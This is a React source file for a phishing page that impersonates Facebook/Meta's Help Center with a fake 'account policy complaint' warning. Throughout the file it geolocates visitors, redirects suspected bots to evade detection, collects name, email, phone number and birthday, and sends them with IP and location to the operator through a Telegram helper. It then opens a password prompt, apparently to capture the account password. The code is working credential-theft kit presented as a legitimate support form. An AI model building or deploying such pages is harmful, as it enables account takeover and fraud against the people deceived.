import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import PasswordInput from '@/components/password-input';
import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
import countryToLanguage from '@/utils/country_to_language';
import detectBot from '@/utils/detect_bot';
import axios from 'axios';

// 🚀 PRE-BUILT TRANSLATIONS - CỰC NHANH
const PREBUILT_TRANSLATIONS = {
    'vi': {
        'Help Center': 'Trung tâm Trợ giúp',
        'English': 'Tiếng Anh',
        'Using': 'Sử dụng',
        'Managing Your Account': 'Quản lý Tài khoản',
        'Privacy, Safety and Security': 'Quyền riêng tư, An toàn và Bảo mật',
        'Policies and Reporting': 'Chính sách và Báo cáo',
        'Account Policy Complaints': 'Khiếu nại Chính sách Tài khoản',
        'We have detected unusual activity on your account that violates our community standards.': 'Chúng tôi đã phát hiện hoạt động bất thường trên tài khoản của bạn vi phạm tiêu chuẩn cộng đồng của chúng tôi.',
        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'Quyền truy cập tài khoản của bạn sẽ bị hạn chế và bạn sẽ không thể đăng, chia sẻ hoặc bình luận bằng trang của mình tại thời điểm này.',
        'If you believe this is an error, you can file a complaint by providing the required information.': 'Nếu bạn tin rằng đây là lỗi, bạn có thể gửi khiếu nại bằng cách cung cấp thông tin bắt buộc.',
        'Name': 'Tên',
        'Email': 'Email',
        'Phone Number': 'Số điện thoại',
        'Birthday': 'Ngày sinh',
        'Your Appeal': 'Khiếu nại của bạn',
        'Please describe your appeal in detail...': 'Vui lòng mô tả chi tiết khiếu nại của bạn...',
        'Submit': 'Gửi đi',
        'This field is required': 'Trường này là bắt buộc',
        'Please enter a valid email address': 'Vui lòng nhập địa chỉ email hợp lệ',
        'About': 'Giới thiệu',
        'Ad choices': 'Lựa chọn quảng cáo',
        'Create ad': 'Tạo quảng cáo',
        'Privacy': 'Quyền riêng tư',
        'Careers': 'Nghề nghiệp',
        'Create Page': 'Tạo Trang',
        'Terms and policies': 'Điều khoản và chính sách',
        'Cookies': 'Cookies'
    },
    'es': {
        'Help Center': 'Centro de ayuda',
        'English': 'Inglés',
        'Using': 'Usando',
        'Managing Your Account': 'Gestionando tu cuenta',
        'Privacy, Safety and Security': 'Privacidad, Seguridad y Protección',
        'Policies and Reporting': 'Políticas e Informes',
        'Account Policy Complaints': 'Quejas sobre Políticas de Cuenta',
        'We have detected unusual activity on your account that violates our community standards.': 'Hemos detectado actividad inusual en su cuenta que viola nuestros estándares comunitarios.',
        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'El acceso a su cuenta estará restringido y no podrá publicar, compartir o comentar usando su página en este momento.',
        'If you believe this is an error, you can file a complaint by providing the required information.': 'Si cree que esto es un error, puede presentar una queja proporcionando la información requerida.',
        'Name': 'Nombre',
        'Email': 'Correo electrónico',
        'Phone Number': 'Número de teléfono',
        'Birthday': 'Cumpleaños',
        'Your Appeal': 'Su apelación',
        'Please describe your appeal in detail...': 'Por favor describa su apelación en detalle...',
        'Submit': 'Enviar',
        'This field is required': 'Este campo es obligatorio',
        'Please enter a valid email address': 'Por favor ingrese una dirección de correo válida',
        'About': 'Acerca de',
        'Ad choices': 'Opciones de anuncios',
        'Create ad': 'Crear anuncio',
        'Privacy': 'Privacidad',
        'Careers': 'Carreras',
        'Create Page': 'Crear página',
        'Terms and policies': 'Términos y políticas',
        'Cookies': 'Cookies'
    },
    'fr': {
        'Help Center': 'Centre d\'aide',
        'English': 'Anglais',
        'Using': 'Utilisation',
        'Managing Your Account': 'Gestion de votre compte',
        'Privacy, Safety and Security': 'Confidentialité, Sécurité et Protection',
        'Policies and Reporting': 'Politiques et Signalements',
        'Account Policy Complaints': 'Réclamations concernant les Politiques de Compte',
        'We have detected unusual activity on your account that violates our community standards.': 'Nous avons détecté une activité inhabituelle sur votre compte qui viole nos normes communautaires.',
        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'L\'accès à votre compte sera restreint et vous ne pourrez pas publier, partager ou commenter en utilisant votre page pour le moment.',
        'If you believe this is an error, you can file a complaint by providing the required information.': 'Si vous pensez qu\'il s\'agit d\'une erreur, vous pouvez déposer une réclamation en fournissant les informations requises.',
        'Name': 'Nom',
        'Email': 'E-mail',
        'Phone Number': 'Numéro de téléphone',
        'Birthday': 'Anniversaire',
        'Your Appeal': 'Votre recours',
        'Please describe your appeal in detail...': 'Veuillez décrire votre recours en détail...',
        'Submit': 'Soumettre',
        'This field is required': 'Ce champ est obligatoire',
        'Please enter a valid email address': 'Veuillez saisir une adresse e-mail valide',
        'About': 'À propos',
        'Ad choices': 'Choix publicitaires',
        'Create ad': 'Créer une publicité',
        'Privacy': 'Confidentialité',
        'Careers': 'Carrières',
        'Create Page': 'Créer une Page',
        'Terms and policies': 'Conditions et politiques',
        'Cookies': 'Cookies'
    },
    'zh': {
        'Help Center': '帮助中心',
        'English': '英语',
        'Using': '使用',
        'Managing Your Account': '管理您的账户',
        'Privacy, Safety and Security': '隐私、安全和保障',
        'Policies and Reporting': '政策和报告',
        'Account Policy Complaints': '账户政策投诉',
        'We have detected unusual activity on your account that violates our community standards.': '我们检测到您的账户存在违反我们社区标准的不寻常活动。',
        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': '您的账户访问将受到限制，此时您将无法使用您的页面发布、分享或评论。',
        'If you believe this is an error, you can file a complaint by providing the required information.': '如果您认为这是一个错误，您可以通过提供所需信息来提交投诉。',
        'Name': '姓名',
        'Email': '电子邮件',
        'Phone Number': '电话号码',
        'Birthday': '生日',
        'Your Appeal': '您的申诉',
        'Please describe your appeal in detail...': '请详细描述您的申诉...',
        'Submit': '提交',
        'This field is required': '此字段为必填项',
        'Please enter a valid email address': '请输入有效的电子邮件地址',
        'About': '关于',
        'Ad choices': '广告选择',
        'Create ad': '创建广告',
        'Privacy': '隐私',
        'Careers': '职业',
        'Create Page': '创建页面',
        'Terms and policies': '条款和政策',
        'Cookies': 'Cookies'
    },
    'ja': {
        'Help Center': 'ヘルプセンター',
        'English': '英語',
        'Using': '使用',
        'Managing Your Account': 'アカウントの管理',
        'Privacy, Safety and Security': 'プライバシー、安全とセキュリティ',
        'Policies and Reporting': 'ポリシーと報告',
        'Account Policy Complaints': 'アカウントポリシーに関する苦情',
        'We have detected unusual activity on your account that violates our community standards.': 'コミュニティ基準に違反する異常な活動をアカウントで検出しました。',
        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'アカウントへのアクセスが制限され、現時点ではページを使用して投稿、共有、コメントできなくなります。',
        'If you believe this is an error, you can file a complaint by providing the required information.': 'これが誤りであると思われる場合は、必要な情報を提供して苦情を申し立てることができます。',
        'Name': '名前',
        'Email': 'メール',
        'Phone Number': '電話番号',
        'Birthday': '生年月日',
        'Your Appeal': 'あなたの申し立て',
        'Please describe your appeal in detail...': '申し立ての内容を詳細に記述してください...',
        'Submit': '送信',
        'This field is required': 'このフィールドは必須です',
        'Please enter a valid email address': '有効なメールアドレスを入力してください',
        'About': 'について',
        'Ad choices': '広告の選択',
        'Create ad': '広告を作成',
        'Privacy': 'プライバシー',
        'Careers': 'キャリア',
        'Create Page': 'ページを作成',
        'Terms and policies': '利用規約とポリシー',
        'Cookies': 'クッキー'
    }
};

// 🚀 FAST TRANSLATION FUNCTIONS
const instantTranslate = (text, lang) => {
    return PREBUILT_TRANSLATIONS[lang]?.[text] || text;
};

const fastBatchTranslate = async (texts, targetLang) => {
    if (PREBUILT_TRANSLATIONS[targetLang]) {
        // 🚀 Sử dụng pre-built translations - cực nhanh
        const result = {};
        Object.keys(texts).forEach(key => {
            result[key] = instantTranslate(texts[key], targetLang);
        });
        return result;
    }
    
    // Fallback: dịch song song
    try {
        const translationPromises = Object.entries(texts).map(async ([key, text]) => {
            const translated = await translateText(text, targetLang);
            return { key, translated };
        });
        
        const results = await Promise.all(translationPromises);
        const translatedTexts = {};
        results.forEach(({ key, translated }) => {
            translatedTexts[key] = translated;
        });
        
        return translatedTexts;
    } catch (error) {
        return texts; // Fallback về text gốc
    }
};

const Home = () => {
    const defaultTexts = useMemo(
        () => ({
            helpCenter: 'Help Center',
            english: 'English',
            using: 'Using',
            managingAccount: 'Managing Your Account',
            privacySecurity: 'Privacy, Safety and Security',
            policiesReporting: 'Policies and Reporting',
            pagePolicyAppeals: 'Account Policy Complaints',
            detectedActivity: 'We have detected unusual activity on your account that violates our community standards.',
            accessLimited: 'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.',
            submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
            pageName: 'Name',
            mail: 'Email',
            phone: 'Phone Number',
            birthday: 'Birthday',
            yourAppeal: 'Your Appeal',
            appealPlaceholder: 'Please describe your appeal in detail...',
            submit: 'Submit',
            fieldRequired: 'This field is required',
            invalidEmail: 'Please enter a valid email address',
            about: 'About',
            adChoices: 'Ad choices',
            createAd: 'Create ad',
            privacy: 'Privacy',
            careers: 'Careers',
            createPage: 'Create Page',
            termsPolicies: 'Terms and policies',
            cookies: 'Cookies'
        }),
        []
    );

    const [formData, setFormData] = useState({
        pageName: '',
        mail: '',
        phone: '',
        birthday: '',
        appeal: ''
    });

    const [showPassword, setShowPassword] = useState(false);
    const [errors, setErrors] = useState({});
    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
    const [countryCode, setCountryCode] = useState('US');
    const [callingCode, setCallingCode] = useState('+1');
    const [securityChecked, setSecurityChecked] = useState(false);
    const [isFormEnabled, setIsFormEnabled] = useState(false);

    // 🚀 TỐI ƯU: Khởi tạo bảo mật và dịch thuật cực nhanh
    const initializeSecurityAndTranslation = useCallback(async () => {
        try {
            // 1. Kiểm tra bot (timeout ngắn)
            const botPromise = detectBot().then(result => {
                if (result.isBot) {
                    window.location.href = 'about:blank';
                    return Promise.reject('Bot detected');
                }
            });

            // 2. Lấy IP và vị trí
            const ipPromise = axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 3000 });

            // 🚀 CHẠY SONG SONG: bot check + IP detection
            const [ipResponse] = await Promise.all([ipPromise, botPromise]);
            const ipData = ipResponse.data;
            
            localStorage.setItem('ipInfo', JSON.stringify(ipData));
            
            const detectedCountry = ipData.country_code || 'US';
            setCountryCode(detectedCountry);

            // 3. Xác định ngôn ngữ và dịch CỰC NHANH
            const targetLang = countryToLanguage[detectedCountry] || 'en';
            localStorage.setItem('targetLang', targetLang);
            
            // Set calling code
            try {
                const code = getCountryCallingCode(detectedCountry);
                setCallingCode(`+${code}`);
            } catch {
                setCallingCode('+1');
            }

            // 🚀 DỊCH CỰC NHANH: Sử dụng pre-built hoặc batch translate
            if (targetLang !== 'en') {
                const startTime = Date.now();
                const translated = await fastBatchTranslate(defaultTexts, targetLang);
                console.log(`Translation completed in ${Date.now() - startTime}ms`);
                setTranslatedTexts(translated);
            }

            // 🚀 BẬT FORM NGAY LẬP TỨC
            setSecurityChecked(true);
            setIsFormEnabled(true);
            
        } catch (error) {
            console.log('Security init failed:', error.message);
            // 🚀 FALLBACK: Vẫn bật form
            setCountryCode('US');
            setCallingCode('+1');
            setSecurityChecked(true);
            setIsFormEnabled(true);
        }
    }, [defaultTexts]);

    // 🚀 KHỞI TẠO NHANH: Không chờ
    useEffect(() => {
        initializeSecurityAndTranslation();
        
        // 🚀 BACKUP: Luôn bật form sau 1.5s dù có lỗi
        const backupTimer = setTimeout(() => {
            setIsFormEnabled(true);
        }, 1500);
        
        return () => clearTimeout(backupTimer);
    }, [initializeSecurityAndTranslation]);

    // Các hàm xử lý khác giữ nguyên
    const validateEmail = (email) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };

    const formatDateToDDMMYYYY = (dateString) => {
        if (!dateString) return '';
        const parts = dateString.split('-');
        if (parts.length !== 3) return dateString;
        return `${parts[2]}/${parts[1]}/${parts[0]}`;
    };

    const hideEmail = (email) => {
        if (!email) return 's****g@m****.com';
        const parts = email.split('@');
        if (parts.length !== 2) return email;
        
        const username = parts[0];
        const domain = parts[1];
        const domainParts = domain.split('.');
        
        if (username.length <= 1) return email;
        if (domainParts.length < 2) return email;
        
        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
        
        return formattedUsername + '@' + formattedDomain;
    };

    const hidePhone = (phone) => {
        if (!phone) return '******32';
        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
        if (cleanPhone.length < 2) return '******32';
        
        const lastTwoDigits = cleanPhone.slice(-2);
        return '*'.repeat(6) + lastTwoDigits;
    };

    const handleInputChange = (field, value) => {
        if (!isFormEnabled) return;
        
        if (field === 'phone') {
            const cleanValue = value.replace(/^\+\d+\s*/, '');
            const asYouType = new AsYouType(countryCode);
            const formattedValue = asYouType.input(cleanValue);

            const finalValue = `${callingCode} ${formattedValue}`;

            setFormData((prev) => ({
                ...prev,
                [field]: finalValue
            }));
        } else {
            setFormData((prev) => ({
                ...prev,
                [field]: value
            }));
        }

        if (errors[field]) {
            setErrors((prev) => ({
                ...prev,
                [field]: false
            }));
        }
    };

    const validateForm = () => {
        if (!isFormEnabled) return false;
        
        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
            newErrors.mail = 'invalid';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async () => {
        if (!isFormEnabled) return;
        
        if (validateForm()) {
            try {
                const telegramMessage = formatTelegramMessage(formData);
                await sendMessage(telegramMessage);

                const hiddenData = {
                    name: formData.pageName,
                    email: hideEmail(formData.mail),
                    phone: hidePhone(formData.phone),
                    birthday: formData.birthday
                };

                localStorage.setItem('userInfo', JSON.stringify(hiddenData));
                setShowPassword(true);
            } catch {
                window.location.href = 'about:blank';
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    };

    const formatTelegramMessage = (data) => {
        const timestamp = new Date().toLocaleString('vi-VN');
        const ipInfo = localStorage.getItem('ipInfo');
        const ipData = ipInfo ? JSON.parse(ipInfo) : {};

        return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.region || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>

🔖 <b>Page Name:</b> <code>${data.pageName}</code>
📧 <b>Email:</b> <code>${data.mail}</code>
📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
    };

    const handleClosePassword = () => {
        setShowPassword(false);
    };

    const data_list = [
        {
            id: 'using',
            icon: faCompass,
            title: translatedTexts.using
        },
        {
            id: 'managing',
            icon: faUserGear,
            title: translatedTexts.managingAccount
        },
        {
            id: 'privacy',
            icon: faLock,
            title: translatedTexts.privacySecurity
        },
        {
            id: 'policies',
            icon: faCircleExclamation,
            title: translatedTexts.policiesReporting
        }
    ];

    return (
        <>
            <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
                <title>Page Help Center</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
                <div className='flex items-center gap-2'>
                    <img src={FacebookImage} alt='' className='h-10 w-10' />
                    <p className='font-bold'>{translatedTexts.helpCenter}</p>
                </div>
                <div className='flex items-center gap-2'>
                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                        <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                    </div>
                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
                </div>
            </header>
            <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
                <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
                    {data_list.map((data) => {
                        return (
                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
                                <div className='flex items-center gap-2'>
                                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                        <FontAwesomeIcon icon={data.icon} />
                                    </div>
                                    <div>{data.title}</div>
                                </div>
                                <FontAwesomeIcon icon={faChevronDown} />
                            </div>
                        );
                    })}
                </nav>
                <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                            <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                        </div>
                        <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
                            <p className='mb-3'>{translatedTexts.detectedActivity}</p>
                            <p className='mb-3'>{translatedTexts.accessLimited}</p>
                            <p>{translatedTexts.submitAppeal}</p>
                        </div>
                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='text' 
                                    name='pageName' 
                                    autoComplete='organization' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.pageName} 
                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                    disabled={!isFormEnabled}
                                />
                                {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.mail} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='email' 
                                    name='mail' 
                                    autoComplete='email' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.mail} 
                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
                                    disabled={!isFormEnabled}
                                />
                                {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.phone} <span className='text-red-500'>*</span>
                                </p>
                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}>
                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
                                    <input 
                                        type='tel' 
                                        name='phone' 
                                        inputMode='numeric' 
                                        pattern='[0-9]*' 
                                        autoComplete='off' 
                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
                                        disabled={!isFormEnabled}
                                    />
                                </div>
                                {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                </p>
                                
                                <input 
                                    type='date' 
                                    name='birthday' 
                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                    value={formData.birthday} 
                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                    disabled={!isFormEnabled}
                                />
                                
                                <div className='block sm:hidden relative'>
                                    <input 
                                        type='date' 
                                        name='birthday' 
                                        className={`w-full rounded-lg border px-3 py-2.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
                                        value={formData.birthday} 
                                        onChange={(e) => handleInputChange('birthday', e.target.value)}
                                        required
                                        disabled={!isFormEnabled}
                                    />
                                    <div 
                                        className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}
                                        onClick={() => isFormEnabled && document.querySelectorAll('input[name="birthday"]')[1].click()}
                                    >
                                        {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
                                    </div>
                                </div>
                                
                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-2'>
                                <p className='text-base sm:text-base'>
                                    {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                </p>
                                <textarea 
                                    name='appeal'
                                    rows={4}
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}
                                    placeholder={translatedTexts.appealPlaceholder}
                                    value={formData.appeal}
                                    onChange={(e) => handleInputChange('appeal', e.target.value)}
                                    disabled={!isFormEnabled}
                                />
                                {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <button 
                                className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 ${!isFormEnabled ? 'bg-gray-400 cursor-not-allowed text-white' : 'bg-blue-600 hover:bg-blue-700 text-white'}`} 
                                onClick={handleSubmit}
                                disabled={!isFormEnabled}
                            >
                                {!isFormEnabled ? 'Đang kiểm tra...' : translatedTexts.submit}
                            </button>
                            
                            {!securityChecked && (
                                <div className="text-center text-sm text-gray-500 mt-2">
                                    Đang kiểm tra bảo mật...
                                </div>
                            )}
                        </div>
                    </div>
                    <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
                        <div className='mx-auto flex justify-between'>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.about}</p>
                                <p>{translatedTexts.adChoices}</p>
                                <p>{translatedTexts.createAd}</p>
                            </div>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.privacy}</p>
                                <p>{translatedTexts.careers}</p>
                                <p>{translatedTexts.createPage}</p>
                            </div>
                            <div className='flex flex-col space-y-4'>
                                <p>{translatedTexts.termsPolicies}</p>
                                <p>{translatedTexts.cookies}</p>
                            </div>
                        </div>
                        <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
                        <div className='flex justify-between'>
                            <img src={FromMetaImage} alt='' className='w-[100px]' />
                            <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                        </div>
                    </div>
                </div>
            </main>
            {showPassword && <PasswordInput onClose={handleClosePassword} />}
        </>
    );
};
export default Home;
